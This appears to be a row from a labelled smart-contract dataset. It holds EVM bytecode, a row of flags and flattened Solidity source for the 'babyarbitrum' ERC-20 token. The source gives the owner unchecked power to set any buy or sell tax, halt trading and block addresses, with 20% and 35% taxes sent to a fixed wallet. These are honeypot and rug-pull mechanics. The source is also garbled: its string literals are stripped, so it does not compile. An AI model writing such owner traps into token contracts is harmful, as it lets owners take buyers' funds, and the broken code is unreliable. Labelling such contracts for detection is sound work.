}}",0x6080604052600436106101bb5760003560e01c8063751039fc116100ec57806395d89b411161008a578063c3c8cd8011610064578063c3c8cd80146104e8578063c9567bf9146104fd578063d543dbeb14610512578063dd62ed3e1461053257600080fd5b806395d89b411461047c578063a9059cbb146104a8578063b16fa527146104c857600080fd5b806382bf293c116100c657806382bf293c146104135780638a8c523c146104335780638da5cb5b146104485780638f9a55c01461046657600080fd5b8063751039fc146103c857806377c89727146103dd5780637d1db4a5146103fd57600080fd5b806334376f3b116101595780636fc3eaec116101335780636fc3eaec1461034857806370a082311461035d57806370f713b714610393578063715018a6146103b357600080fd5b806334376f3b146102f15780634ada218b146103075780636cd19ffa1461032857600080fd5b80631abfa629116101955780631abfa6291461026157806323b872dd1461029357806329e468d8146102b3578063313ce567146102d557600080fd5b806306fdde03146101c7578063095ea7b31461020e57806318160ddd1461023e57600080fd5b366101c257005b600080fd5b3480156101d357600080fd5b5060408051808201909152600c81526b263ab1b5bca337bc21b7b4b760a11b60208201525b60405161020591906118f0565b60405180910390f35b34801561021a57600080fd5b5061022e610229366004611953565b610578565b6040519015158152602001610205565b34801561024a57600080fd5b5061025361058f565b604051908152602001610205565b34801561026d57600080fd5b506010546001600160a01b03165b6040516001600160a01b039091168152602001610205565b34801561029f57600080fd5b5061022e6102ae36600461197f565b6105ae565b3480156102bf57600080fd5b506102d36102ce3660046119c0565b6106aa565b005b3480156102e157600080fd5b50604051600a8152602001610205565b3480156102fd57600080fd5b50610253600e5481565b34801561031357600080fd5b5060105461022e90600160b81b900460ff1681565b34801561033457600080fd5b506102d36103433660046119d9565b6106d9565b34801561035457600080fd5b506102d3610725565b34801561036957600080fd5b506102536103783660046119d9565b6001600160a01b031660009081526001602052604090205490565b34801561039f57600080fd5b506102d36103ae3660046119c0565b610730565b3480156103bf57600080fd5b506102d361075f565b3480156103d457600080fd5b506102d36107d3565b3480156103e957600080fd5b506102d36103f83660046119d9565b61087f565b34801561040957600080fd5b50610253600c5481565b34801561041f57600080fd5b506102d361042e3660046119c0565b6108cb565b34801561043f57600080fd5b506102d3610928565b34801561045457600080fd5b506000546001600160a01b031661027b565b34801561047257600080fd5b50610253600d5481565b34801561048857600080fd5b506040805180820190915260038152624c464360e81b60208201526101f8565b3480156104b457600080fd5b5061022e6104c3366004611953565b610990565b3480156104d457600080fd5b506102d36104e33660046119d9565b610a2b565b3480156104f457600080fd5b506102d3610a77565b34801561050957600080fd5b506102d3610a90565b34801561051e57600080fd5b506102d361052d3660046119c0565b610e47565b34801561053e57600080fd5b5061025361054d3660046119f6565b6001600160a01b03918216600090815260026020908152604080832093909416825291909152205490565b6000610585338484610ec0565b5060015b92915050565b600061059c600a80611b29565b6105a99062989680611b38565b905090565b601054600090600160b81b900460ff16806105d357506000546001600160a01b031633145b806105e85750600f546001600160a01b031633145b806105f257503330145b6106435760405162461bcd60e51b815260206004820152601a60248201527f54726164696e67206973206e6f7420656e61626c65642079657400000000000060448201526064015b60405180910390fd5b61064e848484610fe4565b6106a0843361069b85604051806060016040528060288152602001611cd8602891396001600160a01b038a16600090815260026020908152604080832033845290915290205491906114c2565b610ec0565b5060019392505050565b6000546001600160a01b031633146106d45760405162461bcd60e51b815260040161063a90611b4f565b600a55565b6000546001600160a01b031633146107035760405162461bcd60e51b815260040161063a90611b4f565b600780546001600160a01b0319166001600160a01b0392909216919091179055565b61072e476114fc565b565b6000546001600160a01b0316331461075a5760405162461bcd60e51b815260040161063a90611b4f565b600e55565b6000546001600160a01b031633146107895760405162461bcd60e51b815260040161063a90611b4f565b600080546040516001600160a01b03909116907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0908390a3600080546001600160a01b0319169055565b6000546001600160a01b031633146107fd5760405162461bcd60e51b815260040161063a90611b4f565b610808600a80611b29565b6108159062989680611b38565b600c55610823600a80611b29565b6108309062989680611b38565b600d557f947f344d56e1e8c70dc492fb94c4ddddd490c016aab685f5e7e47b2e85cb44cf61085f600a80611b29565b61086c9062989680611b38565b60405190815260200160405180910390a1565b6000546001600160a01b031633146108a95760405162461bcd60e51b815260040161063a90611b4f565b600580546001600160a01b0319166001600160a01b0392909216919091179055565b6000546001600160a01b031633146108f55760405162461bcd60e51b815260040161063a90611b4f565b610922606461091c83610909600a80611b29565b6109169062989680611b38565b906115dc565b90611665565b600d5550565b6000546001600160a01b031633146109525760405162461bcd60e51b815260040161063a90611b4f565b6010805460ff60b81b1916600160b81b1790556040517f799663458a5ef2936f7fa0c99b3336c69c25890f82974f04e811e5bb359186c790600090a1565b601054600090600160b81b900460ff16806109b557506000546001600160a01b031633145b806109ca5750600f546001600160a01b031633145b806109d457503330145b610a205760405162461bcd60e51b815260206004820152601a60248201527f54726164696e67206973206e6f7420656e61626c656420796574000000000000604482015260640161063a565b610585338484610fe4565b6000546001600160a01b03163314610a555760405162461bcd60e51b815260040161063a90611b4f565b600680546001600160a01b0319166001600160a01b0392909216919091179055565b3060009081526001602052604090205461072e906116a7565b6000546001600160a01b03163314610aba5760405162461bcd60e51b815260040161063a90611b4f565b601054600160a01b900460ff1615610b145760405162461bcd60e51b815260206004820152601760248201527f74726164696e6720697320616c7265616479206f70656e000000000000000000604482015260640161063a565b600f80546001600160a01b031916737a250d5630b4cf539739df2c5dacb4c659f2488d908117909155610b5b903090610b4e600a80611b29565b61069b9062989680611b38565b600f60009054906101000a90046001600160a01b03166001600160a01b031663c45a01556040518163ffffffff1660e01b8152600401602060405180830381865afa158015610bae573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610bd29190611b84565b6001600160a01b031663c9c6539630600f60009054906101000a90046001600160a01b03166001600160a01b031663ad5c46486040518163ffffffff1660e01b8152600401602060405180830381865afa158015610c34573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610c589190611b84565b6040516001600160e01b031960e085901b1681526001600160a01b039283166004820152911660248201526044016020604051808303816000875af1158015610ca5573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610cc99190611b84565b601080546001600160a01b039283166001600160a01b0319909116179055600f541663f305d7194730610d11816001600160a01b031660009081526001602052604090205490565b600080610d266000546001600160a01b031690565b60405160e088901b6001600160e01b03191681526001600160a01b03958616600482015260248101949094526044840192909252606483015290911660848201524260a482015260c40160606040518083038185885af1158015610d8e573d6000803e3d6000fd5b50505050506040513d601f19601f82011682018060405250810190610db39190611ba1565b505060108054600160b01b62ff00ff60a01b19821617909155600f5460405163095ea7b360e01b81526001600160a01b03918216600482015260001960248201529116915063095ea7b3906044016020604051808303816000875af1158015610e20573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610e449190611bcf565b50565b6000546001600160a01b03163314610e715760405162461bcd60e51b815260040161063a90611b4f565b610e85606461091c83610909600a80611b29565b600c8190556040519081527f947f344d56e1e8c70dc492fb94c4ddddd490c016aab685f5e7e47b2e85cb44cf9060200160405180910390a150565b6001600160a01b038316610f225760405162461bcd60e51b8152602060048201526024808201527f45524332303a20617070726f76652066726f6d20746865207a65726f206164646044820152637265737360e01b606482015260840161063a565b6001600160a01b038216610f835760405162461bcd60e51b815260206004820152602260248201527f45524332303a20617070726f766520746f20746865207a65726f206164647265604482015261737360f01b606482015260840161063a565b6001600160a01b0383811660008181526002602090815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925910160405180910390a3505050565b6001600160a01b0383166110485760405162461bcd60e51b815260206004820152602560248201527f45524332303a207472616e736665722066726f6d20746865207a65726f206164604482015264647265737360d81b606482015260840161063a565b6001600160a01b0382166110aa5760405162461bcd60e51b815260206004820152602360248201527f45524332303a207472616e7366657220746f20746865207a65726f206164647260448201526265737360e81b606482015260840161063a565b6000811161110c5760405162461bcd60e51b815260206004820152602960248201527f5472616e7366657220616d6f756e74206d7573742062652067726561746572206044820152687468616e207a65726f60b81b606482015260840161063a565b600080546001600160a01b0385811691161480159061113957506000546001600160a01b03848116911614155b1561137f576001600160a01b03841660009081526004602052604090205460ff1615801561118057506001600160a01b03831660009081526004602052604090205460ff16155b61118957600080fd5b6111ae606461091c6009546000146111a3576008546111a7565b600a545b85906115dc565b6010549091506001600160a01b0385811691161480156111dc5750600f546001600160a01b03848116911614155b801561120157506001600160a01b03831660009081526003602052604090205460ff16155b156112f157600c548211156112585760405162461bcd60e51b815260206004820152601960248201527f4578636565647320746865205f6d61785478416d6f756e742e00000000000000604482015260640161063a565b600d548261127b856001600160a01b031660009081526001602052604090205490565b6112859190611bf1565b11156112d35760405162461bcd60e51b815260206004820152601a60248201527f4578636565647320746865206d617857616c6c657453697a652e000000000000604482015260640161063a565b600954156112f157600980549060006112eb83611c04565b91905055505b30600090815260016020526040902054601054600160a81b900460ff1615801561132957506010546001600160a01b03868116911614155b801561133e5750601054600160b01b900460ff165b801561134b5750600e5481115b801561135b5750600b5460095411155b1561137d5761136b600e546116a7565b47801561137b5761137b476114fc565b505b505b6001600160a01b0384166000908152600160205260409020546113a29083611821565b6001600160a01b0385166000908152600160205260409020556113e76113c88383611821565b6001600160a01b03851660009081526001602052604090205490611863565b6001600160a01b0380851660008181526001602052604090209290925585167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef6114318585611821565b60405190815260200160405180910390a380156114bc57306000908152600160205260409020546114629082611863565b30600081815260016020526040908190209290925590516001600160a01b038616907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef906114b39085815260200190565b60405180910390a35b50505050565b600081848411156114e65760405162461bcd60e51b815260040161063a91906118f0565b5060006114f38486611c1b565b95945050505050565b600580546001600160a01b0316906108fc906115209060649061091c9086906115dc565b6040518115909202916000818181858888f19350505050158015611548573d6000803e3d6000fd5b506006546001600160a01b03166108fc611568606461091c85600a6115dc565b6040518115909202916000818181858888f19350505050158015611590573d6000803e3d6000fd5b506007546001600160a01b03166108fc6115b0606461091c8560556115dc565b6040518115909202916000818181858888f193505050501580156115d8573d6000803e3d6000fd5b5050565b6000826000036115ee57506000610589565b60006115fa8385611b38565b9050826116078583611c2e565b1461165e5760405162461bcd60e51b815260206004820152602160248201527f536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f6044820152607760f81b606482015260840161063a565b9392505050565b600061165e83836040518060400160405280601a81526020017f536166654d6174683a206469766973696f6e206279207a65726f0000000000008152506118c2565b6010805460ff60a81b1916600160a81b17905560408051600280825260608201835260009260208301908036833701905050905030816000815181106116ef576116ef611c50565b6001600160a01b03928316602091820292909201810191909152600f54604080516315ab88c960e31b81529051919093169263ad5c46489260048083019391928290030181865afa158015611748573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061176c9190611b84565b8160018151811061177f5761177f611c50565b6001600160a01b039283166020918202929092010152600f546117a59130911684610ec0565b600f5460405163791ac94760e01b81526001600160a01b039091169063791ac947906117de908590600090869030904290600401611c66565b600060405180830381600087803b1580156117f857600080fd5b505af115801561180c573d6000803e3d6000fd5b50506010805460ff60a81b1916905550505050565b600061165e83836040518060400160405280601e81526020017f536166654d6174683a207375627472616374696f6e206f766572666c6f7700008152506114c2565b6000806118708385611bf1565b90508381101561165e5760405162461bcd60e51b815260206004820152601b60248201527f536166654d6174683a206164646974696f6e206f766572666c6f770000000000604482015260640161063a565b600081836118e35760405162461bcd60e51b815260040161063a91906118f0565b5060006114f38486611c2e565b600060208083528351808285015260005b8181101561191d57858101830151858201604001528201611901565b506000604082860101526040601f19601f8301168501019250505092915050565b6001600160a01b0381168114610e4457600080fd5b6000806040838503121561196657600080fd5b82356119718161193e565b946020939093013593505050565b60008060006060848603121561199457600080fd5b833561199f8161193e565b925060208401356119af8161193e565b929592945050506040919091013590565b6000602082840312156119d257600080fd5b5035919050565b6000602082840312156119eb57600080fd5b813561165e8161193e565b60008060408385031215611a0957600080fd5b8235611a148161193e565b91506020830135611a248161193e565b809150509250929050565b634e487b7160e01b600052601160045260246000fd5b600181815b80851115611a80578160001904821115611a6657611a66611a2f565b80851615611a7357918102915b93841c9390800290611a4a565b509250929050565b600082611a9757506001610589565b81611aa457506000610589565b8160018114611aba5760028114611ac457611ae0565b6001915050610589565b60ff841115611ad557611ad5611a2f565b50506001821b610589565b5060208310610133831016604e8410600b8410161715611b03575081810a610589565b611b0d8383611a45565b8060001904821115611b2157611b21611a2f565b029392505050565b600061165e60ff841683611a88565b808202811582820484141761058957610589611a2f565b6020808252818101527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604082015260600190565b600060208284031215611b9657600080fd5b815161165e8161193e565b600080600060608486031215611bb657600080fd5b8351925060208401519150604084015190509250925092565b600060208284031215611be157600080fd5b8151801515811461165e57600080fd5b8082018082111561058957610589611a2f565b600081611c1357611c13611a2f565b506000190190565b8181038181111561058957610589611a2f565b600082611c4b57634e487b7160e01b600052601260045260246000fd5b500490565b634e487b7160e01b600052603260045260246000fd5b600060a082018783526020878185015260a0604085015281875180845260c086019150828901935060005b81811015611cb65784516001600160a01b031683529383019391830191600101611c91565b50506001600160a01b0396909616606085015250505060800152939250505056fe45524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e6365a2646970667358221220252c5186af63cdad3aaf2bf9c3a3cdba0d6db4297b61d624408096582ab4a91964736f6c63430008110033,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0
" // SPDX-License-Identifier: Unlicensed pragma solidity ^0.8.9; abstract contract Context { function _msgSender() internal view virtual returns (address) { return msg.sender; } } interface IERC20 { function totalSupply() external view returns (uint256); function balanceOf(address account) external view returns (uint256); function transfer(address recipient, uint256 amount) external returns (bool); function allowance(address owner, address spender) external view returns (uint256); function approve(address spender, uint256 amount) external returns (bool); function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); event Approval( address indexed owner, address indexed spender, uint256 value ); } contract Ownable is Context { address private _owner; address private _previousOwner; event OwnershipTransferred( address indexed previousOwner, address indexed newOwner ); constructor() { address msgSender = _msgSender(); _owner = msgSender; emit OwnershipTransferred(address(0), msgSender); } function owner() public view returns (address) { return _owner; } modifier onlyOwner() { require(_owner == _msgSender(), ); _; } function renounceOwnership() public virtual onlyOwner { emit OwnershipTransferred(_owner, address(0)); _owner = address(0); } function transferOwnership(address newOwner) public virtual onlyOwner { require( newOwner != address(0), ); emit OwnershipTransferred(_owner, newOwner); _owner = newOwner; } } library SafeMath { function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; require(c >= a, ); return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { return sub(a, b, ); } function sub( uint256 a, uint256 b, string memory errorMessage ) internal pure returns (uint256) { require(b <= a, errorMessage); uint256 c = a - b; return c; } function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; require(c / a == b, ); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { return div(a, b, ); } function div( uint256 a, uint256 b, string memory errorMessage ) internal pure returns (uint256) { require(b > 0, errorMessage); uint256 c = a / b; return c; } } interface IUniswapV2Factory { function createPair(address tokenA, address tokenB) external returns (address pair); } interface IUniswapV2Router02 { function swapExactTokensForETHSupportingFeeOnTransferTokens( uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline ) external; function factory() external pure returns (address); function WETH() external pure returns (address); function addLiquidityETH( address token, uint256 amountTokenDesired, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline ) external payable returns ( uint256 amountToken, uint256 amountETH, uint256 liquidity ); } contract babyarbitrum is Context, IERC20, Ownable { using SafeMath for uint256; string private constant _name = ; string private constant _symbol = unicode; uint8 private constant _decimals = 9; mapping(address => uint256) private _rOwned; mapping(address => uint256) private _tOwned; mapping(address => mapping(address => uint256)) private _allowances; mapping(address => bool) private _isExcludedFromFee; uint256 private constant MAX = ~uint256(0); uint256 private constant _tTotal = 1000000000 * 10**9; uint256 private _rTotal = (MAX - (MAX % _tTotal)); uint256 private _tFeeTotal; uint256 private _redisFeeOnBuy = 0; uint256 private _taxFeeOnBuy = 20; uint256 private _redisFeeOnSell = 0; uint256 private _taxFeeOnSell = 35; //Original Fee uint256 private _redisFee = _redisFeeOnSell; uint256 private _taxFee = _taxFeeOnSell; uint256 private _previousredisFee = _redisFee; uint256 private _previoustaxFee = _taxFee; mapping(address => bool) public bots; mapping(address => uint256) public _buyMap; address payable private _developmentAddress = payable(0x682BCAb6cBeC1f5D94822FDdA96fb8077009A3E0); address payable private _marketingAddress = payable(0x682BCAb6cBeC1f5D94822FDdA96fb8077009A3E0); IUniswapV2Router02 public uniswapV2Router; address public uniswapV2Pair; bool private tradingOpen = true; bool private inSwap = false; bool private swapEnabled = true; uint256 public _maxTxAmount = 20000000 * 10**9; uint256 public _maxWalletSize = 20000000 * 10**9; uint256 public _swapTokensAtAmount = 2000000 * 10**9; event MaxTxAmountUpdated(uint256 _maxTxAmount); modifier lockTheSwap() { inSwap = true; _; inSwap = false; } constructor() { _rOwned[_msgSender()] = _rTotal; //0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D uniswap //0xD99D1c33F9fC3444f8101754aBC46c52416550D1 bsc test IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02( 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D ); // uniswapV2Router = _uniswapV2Router; uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()) .createPair(address(this), _uniswapV2Router.WETH()); _isExcludedFromFee[owner()] = true; _isExcludedFromFee[address(this)] = true; _isExcludedFromFee[_developmentAddress] = true; _isExcludedFromFee[_marketingAddress] = true; emit Transfer(address(0), _msgSender(), _tTotal); } function name() public pure returns (string memory) { return _name; } function symbol() public pure returns (string memory) { return _symbol; } function decimals() public pure returns (uint8) { return _decimals; } function totalSupply() public pure override returns (uint256) { return _tTotal; } function balanceOf(address account) public view override returns (uint256) { return tokenFromReflection(_rOwned[account]); } function transfer(address recipient, uint256 amount) public override returns (bool) { _transfer(_msgSender(), recipient, amount); return true; } function allowance(address owner, address spender) public view override returns (uint256) { return _allowances[owner][spender]; } function approve(address spender, uint256 amount) public override returns (bool) { _approve(_msgSender(), spender, amount); return true; } function transferFrom( address sender, address recipient, uint256 amount ) public override returns (bool) { _transfer(sender, recipient, amount); _approve( sender, _msgSender(), _allowances[sender][_msgSender()].sub( amount, ) ); return true; } function tokenFromReflection(uint256 rAmount) private view returns (uint256) { require( rAmount <= _rTotal, ); uint256 currentRate = _getRate(); return rAmount.div(currentRate); } function removeAllFee() private { if (_redisFee == 0 && _taxFee == 0) return; _previousredisFee = _redisFee; _previoustaxFee = _taxFee; _redisFee = 0; _taxFee = 0; } function restoreAllFee() private { _redisFee = _previousredisFee; _taxFee = _previoustaxFee; } function _approve( address owner, address spender, uint256 amount ) private { require(owner != address(0), ); require(spender != address(0), ); _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); } function _transfer( address from, address to, uint256 amount ) private { require(from != address(0), ); require(to != address(0), ); require(amount > 0, ); if (from != owner() && to != owner()) { //Trade start check if (!tradingOpen) { require( from == owner(), ); } require(amount <= _maxTxAmount, ); require( !bots[from] && !bots[to], ); if (to != uniswapV2Pair) { require( balanceOf(to) + amount < _maxWalletSize, ); } uint256 contractTokenBalance = balanceOf(address(this)); bool canSwap = contractTokenBalance >= _swapTokensAtAmount; if (contractTokenBalance >= _maxTxAmount) { contractTokenBalance = _maxTxAmount; } if ( canSwap && !inSwap && from != uniswapV2Pair && swapEnabled && !_isExcludedFromFee[from] && !_isExcludedFromFee[to] ) { swapTokensForEth(contractTokenBalance); uint256 contractETHBalance = address(this).balance; if (contractETHBalance > 0) { sendETHToFee(address(this).balance); } } } bool takeFee = true; //Transfer Tokens if ( (_isExcludedFromFee[from] || _isExcludedFromFee[to]) || (from != uniswapV2Pair && to != uniswapV2Pair) ) { takeFee = false; } else { //Set Fee for Buys if (from == uniswapV2Pair && to != address(uniswapV2Router)) { _redisFee = _redisFeeOnBuy; _taxFee = _taxFeeOnBuy; } //Set Fee for Sells if (to == uniswapV2Pair && from != address(uniswapV2Router)) { _redisFee = _redisFeeOnSell; _taxFee = _taxFeeOnSell; } } _tokenTransfer(from, to, amount, takeFee); } function swapTokensForEth(uint256 tokenAmount) private lockTheSwap { address[] memory path = new address[](2); path[0] = address(this); path[1] = uniswapV2Router.WETH(); _approve(address(this), address(uniswapV2Router), tokenAmount); uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens( tokenAmount, 0, path, address(this), block.timestamp ); } function sendETHToFee(uint256 amount) private { _marketingAddress.transfer(amount); } function setTrading(bool _tradingOpen) public onlyOwner { tradingOpen = _tradingOpen; } function manualswap() external { require( _msgSender() == _developmentAddress || _msgSender() == _marketingAddress ); uint256 contractBalance = balanceOf(address(this)); swapTokensForEth(contractBalance); } function manualsend() external { require( _msgSender() == _developmentAddress || _msgSender() == _marketingAddress ); uint256 contractETHBalance = address(this).balance; sendETHToFee(contractETHBalance); } function _tokenTransfer( address sender, address recipient, uint256 amount, bool takeFee ) private { if (!takeFee) removeAllFee(); _transferStandard(sender, recipient, amount); if (!takeFee) restoreAllFee(); } function _transferStandard( address sender, address recipient, uint256 tAmount ) private { ( uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tTeam ) = _getValues(tAmount); _rOwned[sender] = _rOwned[sender].sub(rAmount); _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount); _takeTeam(tTeam); _reflectFee(rFee, tFee); emit Transfer(sender, recipient, tTransferAmount); } function _takeTeam(uint256 tTeam) private { uint256 currentRate = _getRate(); uint256 rTeam = tTeam.mul(currentRate); _rOwned[address(this)] = _rOwned[address(this)].add(rTeam); } function _reflectFee(uint256 rFee, uint256 tFee) private { _rTotal = _rTotal.sub(rFee); _tFeeTotal = _tFeeTotal.add(tFee); } receive() external payable {} function _getValues(uint256 tAmount) private view returns ( uint256, uint256, uint256, uint256, uint256, uint256 ) { (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getTValues( tAmount, _redisFee, _taxFee ); uint256 currentRate = _getRate(); (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues( tAmount, tFee, tTeam, currentRate ); return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam); } function _getTValues( uint256 tAmount, uint256 redisFee, uint256 taxFee ) private pure returns ( uint256, uint256, uint256 ) { uint256 tFee = tAmount.mul(redisFee).div(100); uint256 tTeam = tAmount.mul(taxFee).div(100); uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam); return (tTransferAmount, tFee, tTeam); } function _getRValues( uint256 tAmount, uint256 tFee, uint256 tTeam, uint256 currentRate ) private pure returns ( uint256, uint256, uint256 ) { uint256 rAmount = tAmount.mul(currentRate); uint256 rFee = tFee.mul(currentRate); uint256 rTeam = tTeam.mul(currentRate); uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam); return (rAmount, rTransferAmount, rFee); } function _getRate() private view returns (uint256) { (uint256 rSupply, uint256 tSupply) = _getCurrentSupply(); return rSupply.div(tSupply); } function _getCurrentSupply() private view returns (uint256, uint256) { uint256 rSupply = _rTotal; uint256 tSupply = _tTotal; if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal); return (rSupply, tSupply); } function setFee( uint256 redisFeeOnBuy, uint256 redisFeeOnSell, uint256 taxFeeOnBuy, uint256 taxFeeOnSell ) public onlyOwner { _redisFeeOnBuy = redisFeeOnBuy; _redisFeeOnSell = redisFeeOnSell; _taxFeeOnBuy = taxFeeOnBuy; _taxFeeOnSell = taxFeeOnSell; } //Set minimum tokens required to swap. function setMinSwapTokensThreshold(uint256 swapTokensAtAmount) public onlyOwner { _swapTokensAtAmount = swapTokensAtAmount; } //Set minimum tokens required to swap. function toggleSwap(bool _swapEnabled) public onlyOwner { swapEnabled = _swapEnabled; } //Set maximum transaction function setMaxTxnAmount(uint256 maxTxAmount) public onlyOwner { _maxTxAmount = maxTxAmount; } function setMaxWalletSize(uint256 maxWalletSize) public onlyOwner { _maxWalletSize = maxWalletSize; } function setMaxAll() public onlyOwner { _maxWalletSize = _tTotal; _maxTxAmount = _tTotal; } } ",0x6080604052600436106101bb5760003560e01c80637d1db4a5116100ec578063a2a957bb1161008a578063c3c8cd8011610064578063c3c8cd80146105f5578063dd62ed3e1461060c578063ea1644d514610649578063f2fde38b14610672576101c2565b8063a2a957bb14610552578063a9059cbb1461057b578063bfd79284146105b8576101c2565b80638f70ccf7116100c65780638f70ccf7146104aa5780638f9a55c0146104d357806395d89b41146104fe57806398a5c31514610529576101c2565b80637d1db4a5146104175780637f2feddc146104425780638da5cb5b1461047f576101c2565b806341c2bd55116101595780636fc3eaec116101335780636fc3eaec1461038357806370a082311461039a578063715018a6146103d757806374010ece146103ee576101c2565b806341c2bd551461031857806349bd5a5e1461032f5780636d8aa8f81461035a576101c2565b806318160ddd1161019557806318160ddd1461025a57806323b872dd146102855780632fd689e3146102c2578063313ce567146102ed576101c2565b806306fdde03146101c7578063095ea7b3146101f25780631694505e1461022f576101c2565b366101c257005b600080fd5b3480156101d357600080fd5b506101dc61069b565b6040516101e991906128fe565b60405180910390f35b3480156101fe57600080fd5b50610219600480360381019061021491906129b9565b6106d8565b6040516102269190612a14565b60405180910390f35b34801561023b57600080fd5b506102446106f6565b6040516102519190612a8e565b60405180910390f35b34801561026657600080fd5b5061026f61071c565b60405161027c9190612ab8565b60405180910390f35b34801561029157600080fd5b506102ac60048036038101906102a79190612ad3565b61072c565b6040516102b99190612a14565b60405180910390f35b3480156102ce57600080fd5b506102d7610805565b6040516102e49190612ab8565b60405180910390f35b3480156102f957600080fd5b5061030261080b565b60405161030f9190612b42565b60405180910390f35b34801561032457600080fd5b5061032d610814565b005b34801561033b57600080fd5b506103446108c9565b6040516103519190612b6c565b60405180910390f35b34801561036657600080fd5b50610381600480360381019061037c9190612bb3565b6108ef565b005b34801561038f57600080fd5b506103986109a1565b005b3480156103a657600080fd5b506103c160048036038101906103bc9190612be0565b610a72565b6040516103ce9190612ab8565b60405180910390f35b3480156103e357600080fd5b506103ec610ac3565b005b3480156103fa57600080fd5b5061041560048036038101906104109190612c0d565b610c16565b005b34801561042357600080fd5b5061042c610cb5565b6040516104399190612ab8565b60405180910390f35b34801561044e57600080fd5b5061046960048036038101906104649190612be0565b610cbb565b6040516104769190612ab8565b60405180910390f35b34801561048b57600080fd5b50610494610cd3565b6040516104a19190612b6c565b60405180910390f35b3480156104b657600080fd5b506104d160048036038101906104cc9190612bb3565b610cfc565b005b3480156104df57600080fd5b506104e8610dae565b6040516104f59190612ab8565b60405180910390f35b34801561050a57600080fd5b50610513610db4565b60405161052091906128fe565b60405180910390f35b34801561053557600080fd5b50610550600480360381019061054b9190612c0d565b610df1565b005b34801561055e57600080fd5b5061057960048036038101906105749190612c3a565b610e90565b005b34801561058757600080fd5b506105a2600480360381019061059d91906129b9565b610f47565b6040516105af9190612a14565b60405180910390f35b3480156105c457600080fd5b506105df60048036038101906105da9190612be0565b610f65565b6040516105ec9190612a14565b60405180910390f35b34801561060157600080fd5b5061060a610f85565b005b34801561061857600080fd5b50610633600480360381019061062e9190612ca1565b61105e565b6040516106409190612ab8565b60405180910390f35b34801561065557600080fd5b50610670600480360381019061066b9190612c0d565b6110e5565b005b34801561067e57600080fd5b5061069960048036038101906106949190612be0565b611184565b005b60606040518060400160405280600d81526020017f4261627920417262697472756d00000000000000000000000000000000000000815250905090565b60006106ec6106e5611345565b848461134d565b6001905092915050565b601460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000670de0b6b3a7640000905090565b6000610739848484611516565b6107fa84610745611345565b6107f58560405180606001604052806028815260200161379860289139600460008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006107ab611345565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054611d999092919063ffffffff16565b61134d565b600190509392505050565b60185481565b60006009905090565b61081c611345565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16146108a9576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016108a090612d2d565b60405180910390fd5b670de0b6b3a7640000601781905550670de0b6b3a7640000601681905550565b601560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6108f7611345565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614610984576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161097b90612d2d565b60405180910390fd5b80601560166101000a81548160ff02191690831515021790555050565b601260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166109e2611345565b73ffffffffffffffffffffffffffffffffffffffff161480610a585750601360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16610a40611345565b73ffffffffffffffffffffffffffffffffffffffff16145b610a6157600080fd5b6000479050610a6f81611dfd565b50565b6000610abc600260008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054611e69565b9050919050565b610acb611345565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614610b58576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610b4f90612d2d565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffff